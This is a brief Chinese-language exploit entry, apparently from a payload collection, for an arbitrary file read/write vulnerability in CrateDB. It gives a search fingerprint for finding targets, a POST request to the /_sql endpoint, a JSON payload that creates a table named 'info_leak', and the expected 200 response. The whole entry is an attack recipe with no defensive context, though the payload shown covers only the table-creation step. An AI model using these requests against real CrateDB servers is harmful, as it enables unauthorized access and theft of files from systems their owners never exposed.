# CrateDB数据库任意文件读取漏洞

CrateDB ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="CrateDB"`
- **请求**：`POST /_sql?types HTTP/1.1`

**Payload**
```
{"stmt":"CREATE TABLE info_leak(info_leak STRING);"}
```
- **响应特征**：200